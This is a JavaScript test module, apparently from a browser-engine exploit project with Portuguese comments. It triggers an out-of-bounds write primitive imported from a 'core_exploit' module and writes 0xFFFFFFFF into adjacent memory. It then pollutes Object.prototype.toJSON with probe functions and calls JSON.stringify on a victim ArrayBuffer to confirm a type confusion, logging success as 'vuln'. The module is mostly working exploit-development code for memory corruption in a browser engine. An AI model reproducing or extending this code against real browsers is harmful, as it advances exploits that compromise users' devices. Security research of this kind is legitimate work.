// js/script3/testSequentialStringify.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs'; // <--- IMPORTAÇÃO CRUCIAL

// --- Variantes da toJSON para sondar victim_ab (ArrayBuffer) ---

export function toJSON_AB_Probe_V1() {
    const FNAME_toJSON = "toJSON_AB_Probe_V1";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: Object.prototype.toString.call(this),
        is_array_buffer_instance_entry: this instanceof ArrayBuffer,
        byteLength_prop: "N/A",
        is_dataview_created: false,
        dv_write_val: 0xBADDBADD,
        dv_read_val: "N/A",
        dv_rw_match: false,
        error: null
    };
    logS3(`[${FNAME_toJSON}] Entrando. this type: ${result.this_type_entry}, instanceof AB: ${result.is_array_buffer_instance_entry}`, "info", FNAME_toJSON);
    try {
        if (!result.is_array_buffer_instance_entry) {
            result.error = "this is not an ArrayBuffer instance at entry.";
            logS3(`[${FNAME_toJSON}] ${result.error}`, "critical", FNAME_toJSON);
            return result;
        }
        result.byteLength_prop = this.byteLength;
        const dv = new DataView(this);
        result.is_dataview_created = true;

        if (this.byteLength >= 4) {
            dv.setUint32(0, result.dv_write_val, true);
            const readVal = dv.getUint32(0, true);
            result.dv_read_val = toHex(readVal);
            if (readVal === result.dv_write_val) {
                result.dv_rw_match = true;
            }
        } else {
            result.dv_read_val = `Buffer too small for DV R/W (size: ${this.byteLength})`;
        }
    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
        logS3(`[${FNAME_toJSON}] ERRO: ${result.error}`, "error", FNAME_toJSON);
    }
    return result;
}

export function toJSON_AB_Probe_V2_Detailed() {
    const FNAME_toJSON = "toJSON_AB_Probe_V2_Detailed";
    let result = {
        toJSON_variant: FNAME_toJSON,
        this_type_entry: "N/A",
        is_array_buffer_instance_entry: false,
        byteLength_prop: "N/A",
        for_in_iterations: 0,
        this_type_in_loop: "N/A",
        this_type_after_loop: "N/A",
        error: null
    };

    logS3(`[${FNAME_toJSON}] Entrando. this type inicial: ${Object.prototype.toString.call(this)}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);
    result.this_type_entry = Object.prototype.toString.call(this);
    result.is_array_buffer_instance_entry = this instanceof ArrayBuffer;

    try {
        if (!result.is_array_buffer_instance_entry) {
            result.error = "this is not an ArrayBuffer instance at ENTRY.";
            logS3(`[${FNAME_toJSON}] ${result.error}`, "critical", FNAME_toJSON);
            return result;
        }

        result.byteLength_prop = this.byteLength;
        logS3(`[${FNAME_toJSON}] Antes do for...in. this type: ${Object.prototype.toString.call(this)}, len: ${this.byteLength}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);

        for (const prop in this) {
            result.for_in_iterations++;
            const current_this_type_in_loop = Object.prototype.toString.call(this);
            const current_instanceof_ab_in_loop = this instanceof ArrayBuffer;
            if (result.for_in_iterations === 1) { // Captura o tipo na primeira iteração do loop
                result.this_type_in_loop = current_this_type_in_loop;
            }
            logS3(`[${FNAME_toJSON}] Dentro do for...in, iter ${result.for_in_iterations}, prop: '${prop}'. this type: ${current_this_type_in_loop}, instanceof AB: ${current_instanceof_ab_in_loop}`, "info", FNAME_toJSON);

            if (!current_instanceof_ab_in_loop && result.is_array_buffer_instance_entry) { // Compara com o estado na entrada
                logS3(`[${FNAME_toJSON}] !!!! TYPE CONFUSION DETECTADA DENTRO do loop for...in !!!! this era ArrayBuffer na entrada, agora é ${current_this_type_in_loop}`, "critical", FNAME_toJSON);
                result.error = `Type confusion inside for...in (was ${result.this_type_entry}, became ${current_this_type_in_loop})`;
                result.this_type_in_loop = current_this_type_in_loop; // Garante que o tipo confuso seja registrado
                break; 
            }
            if (result.for_in_iterations > 100) {
                logS3(`[${FNAME_toJSON}] Loop for...in excedeu 100 iterações. Interrompendo.`, "warn", FNAME_toJSON);
                if (!result.error) result.error = "Max iterations reached in for...in";
                break;
            }
        }
        result.this_type_after_loop = Object.prototype.toString.call(this);
        logS3(`[${FNAME_toJSON}] Após o for...in. Iterações: ${result.for_in_iterations}. this type final: ${result.this_type_after_loop}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);

    } catch (e) {
        result.error = `${e.name}: ${e.message}`;
        logS3(`[${FNAME_toJSON}] ERRO GERAL na toJSON: ${result.error}. this type: ${Object.prototype.toString.call(this)}`, "error", FNAME_toJSON);
    }
    return result;
}

export function toJSON_AB_Probe_V3() {
    const FNAME_toJSON = "toJSON_AB_Probe_V3";
    let result = toJSON_AB_Probe_V2_Detailed(); // Chama V2_Detailed primeiro
    result.toJSON_variant = FNAME_toJSON; 
    result.props_assigned_count = 0;
    result.assignment_error_detail = null;

    if (result.error) { 
        logS3(`[${FNAME_toJSON}] Erro prévio de V2_Detailed ('${result.error}'), pulando lógica de atribuição V3. this_type_entry para V2_Detailed foi: ${result.this_type_entry}`, "warn", FNAME_toJSON);
        return result;
    }

    let props_payload = {};
    try {
        logS3(`[${FNAME_toJSON}] Entrando na lógica de atribuição V3. this type atual (após V2_Detailed): ${Object.prototype.toString.call(this)}, instanceof AB: ${this instanceof ArrayBuffer}`, "info", FNAME_toJSON);
        if (!(this instanceof ArrayBuffer)) { // Re-checa crucial
            result.assignment_error_detail = `Type confusion before V3 assignment loop: 'this' is ${Object.prototype.toString.call(this)}`;
            logS3(`[${FNAME_toJSON}] ${result.assignment_error_detail}`, "critical", FNAME_toJSON);
            if (!result.error) result.error = result.assignment_error_detail;
            return result;
        }

        let v3_iterations = 0; 
        for (const prop in this) {
            v3_iterations++;
            const current_this_type_v3 = Object.prototype.toString.call(this);
            const current_instanceof_ab_v3 = this instanceof ArrayBuffer;
             if (!current_instanceof_ab_v3) {
                logS3(`[${FNAME_toJSON}] !!!! TYPE CONFUSION DETECTADA ANTES DA ATRIBUIÇÃO na iter ${v3_iterations}!!!! this é ${current_this_type_v3}`, "critical", FNAME_toJSON);
                result.assignment_error_detail = `Type confusion before assignment in V3 (iter ${v3_iterations}, became ${current_this_type_v3})`;
                if (!result.error) result.error = result.assignment_error_detail;
                break;
            }

            if (Object.prototype.hasOwnProperty.call(this, prop)) {
                try {
                    if (typeof this[prop] !== 'function') {
                        props_payload[prop] = String(this[prop]).substring(0, 50);
                        result.props_assigned_count++;
                    }
                } catch (e_assign) {
                    result.assignment_error_detail = `Error assigning prop '${prop}': ${e_assign.name} - ${e_assign.message}`;
                    logS3(`[${FNAME_toJSON}] ERRO ao processar/atribuir prop '${prop}': ${result.assignment_error_detail}`, "warn", FNAME_toJSON);
                }
            }
            if (v3_iterations > 100) {
                logS3(`[${FNAME_toJSON}] Loop de atribuição V3 excedeu 100 iterações.`, "warn", FNAME_toJSON);
                if (!result.assignment_error_detail && !result.error) result.error = "Max iterations in V3 assignment loop";
                break;
            }
        }
        logS3(`[${FNAME_toJSON}] Loop de atribuição V3 completou ${v3_iterations} iterações. Props atribuídas: ${result.props_assigned_count}`, "info", FNAME_toJSON);

    } catch (e_for_in_v3) {
        result.assignment_error_detail = `Erro no loop de atribuição V3: ${e_for_in_v3.name}: ${e_for_in_v3.message}`;
        if (!result.error) result.error = result.assignment_error_detail;
        logS3(`[${FNAME_toJSON}] ERRO GERAL no loop de atribuição V3: ${result.assignment_error_detail}`, "error", FNAME_toJSON);
    }
    return result;
}

export async function executeSequentialStringifyTest() {
    const FNAME_TEST = `executeSequentialStringifyTest`;
    logS3(`--- Iniciando Teste: Sondagem Sequencial de victim_ab com Diferentes toJSONs ---`, "test", FNAME_TEST);
    document.title = `Seq. Stringify victim_ab`;

    const victim_ab_size_val = 64;
    // A linha abaixo é onde OOB_CONFIG é usado. Se config.mjs não exporta OOB_CONFIG ou a importação falha, aqui dará erro.
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando teste principal.", "error", FNAME_TEST);
        return { setupError: new Error("OOB Setup Failed") };
    }

    let victim_ab;
    try {
        victim_ab = new ArrayBuffer(victim_ab_size_val);
        victim_ab.customPropStr = "hello_victim_seq";
        victim_ab.customPropNum = 54321;
        logS3(`1. victim_ab criado com props customizadas (para uso sequencial).`, "info", FNAME_TEST);
    } catch (e_victim_alloc) {
        logS3(`ERRO ao criar victim_ab: ${e_victim_alloc.message}. Abortando.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: e_victim_alloc };
    }
    try {
        logS3(`2. Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]... (UMA VEZ)`, "warn", FNAME_TEST);
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: e_write };
    }
    await PAUSE_S3(SHORT_PAUSE_S3);

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let result_call1 = null;
    let result_call2 = null;

    // --- CHAMADA 1 ---
    const toJSON_Call1_Func = toJSON_AB_Probe_V2_Detailed;
    const toJSON_Call1_Name = "toJSON_AB_Probe_V2_Detailed";
    logS3(`\n--- CHAMADA 1: JSON.stringify(victim_ab) com ${toJSON_Call1_Name} ---`, "subtest", FNAME_TEST);
    try {
        Object.defineProperty(Object.prototype, ppKey_val, { value: toJSON_Call1_Func, writable: true, configurable: true, enumerable: false });
        pollutionApplied = true;
        document.title = `Seq. TC - Call 1 (${toJSON_Call1_Name})`;
        result_call1 = JSON.stringify(victim_ab);
        logS3(`   Resultado da toJSON (Chamada 1 - ${toJSON_Call1_Name}): ${JSON.stringify(result_call1)}`, "info", FNAME_TEST);
        if (result_call1 && result_call1.error) {
            logS3(`     ERRO INTERNO (reportado pela toJSON) na Chamada 1: ${result_call1.error}`, "warn", FNAME_TEST);
        }
    } catch (e_str1) {
        logS3(`   !!!! ERRO AO STRINGIFY (Chamada 1 - ${toJSON_Call1_Name}) !!!!: ${e_str1.name} - ${e_str1.message}`, "critical", FNAME_TEST);
        if (e_str1.stack) logS3(`       Stack: ${e_str1.stack}`, "error");
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
            pollutionApplied = false;
        }
    }

    let state_after_call1 = "N/A";
    try {
        state_after_call1 = `Type: ${Object.prototype.toString.call(victim_ab)}, instanceof AB: ${victim_ab instanceof ArrayBuffer}, byteLength: ${victim_ab ? victim_ab.byteLength : 'N/A'}`;
        logS3(`   Estado de victim_ab APÓS Chamada 1 (${toJSON_Call1_Name}): ${state_after_call1}`, "info", FNAME_TEST);
    } catch (e_check1) {
        state_after_call1 = `Error checking victim_ab: ${e_check1.message}`;
        logS3(`   ERRO ao checar victim_ab APÓS Chamada 1: ${e_check1.message}`, "error", FNAME_TEST);
    }
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // --- CHAMADA 2 ---
    const toJSON_Call2_Func = toJSON_AB_Probe_V1;
    const toJSON_Call2_Name = "toJSON_AB_Probe_V1";
    logS3(`\n--- CHAMADA 2: JSON.stringify(victim_ab) com ${toJSON_Call2_Name} (MESMO victim_ab) ---`, "subtest", FNAME_TEST);
    try {
        Object.defineProperty(Object.prototype, ppKey_val, { value: toJSON_Call2_Func, writable: true, configurable: true, enumerable: false });
        pollutionApplied = true;
        document.title = `Seq. TC - Call 2 (${toJSON_Call2_Name})`;
        result_call2 = JSON.stringify(victim_ab);
        logS3(`   Resultado da toJSON (Chamada 2 - ${toJSON_Call2_Name}): ${JSON.stringify(result_call2)}`, "info", FNAME_TEST);
        if (result_call2 && result_call2.error) {
            logS3(`     ERRO INTERNO (reportado pela toJSON) na Chamada 2: ${result_call2.error}`, "warn", FNAME_TEST);
        }
    } catch (e_str2) {
        logS3(`   !!!! ERRO AO STRINGIFY (Chamada 2 - ${toJSON_Call2_Name}) !!!!: ${e_str2.name} - ${e_str2.message}`, "critical", FNAME_TEST);
        if (e_str2.stack) logS3(`       Stack: ${e_str2.stack}`, "error");
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    logS3("\n--- Análise Final do Teste de TC Sequencial ---", "test", FNAME_TEST);
    let tc_confirmed_on_second_call = false;
    if (result_call2 && result_call2.toJSON_variant === "toJSON_AB_Probe_V1") {
        if (result_call2.error && result_call2.error.includes("not an ArrayBuffer instance at entry")) {
            tc_confirmed_on_second_call = true;
        } else if (!result_call2.is_array_buffer_instance_entry) {
             tc_confirmed_on_second_call = true;
        }
    }

    if (tc_confirmed_on_second_call) {
        logS3("   !!!! TYPE CONFUSION CONFIRMADA NA ENTRADA DA SEGUNDA CHAMADA toJSON (V1) !!!!", "vuln", FNAME_TEST);
        logS3(`        Na Chamada 2 (V1), this_type_entry foi: ${result_call2.this_type_entry}, is_array_buffer_instance_entry: ${result_call2.is_array_buffer_instance_entry}`, "vuln", FNAME_TEST);
        document.title = "SUCCESS: TC on 2nd Call Confirmed!";
    } else {
        logS3("   Chamada 2 (V1): victim_ab ainda parece ser um ArrayBuffer funcional na entrada da toJSON. Type Confusion não reproduzida neste teste.", "good", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`==== Teste de Reprodução de TC Sequencial CONCLUÍDO ====`, 'test', FNAME_TEST);
}
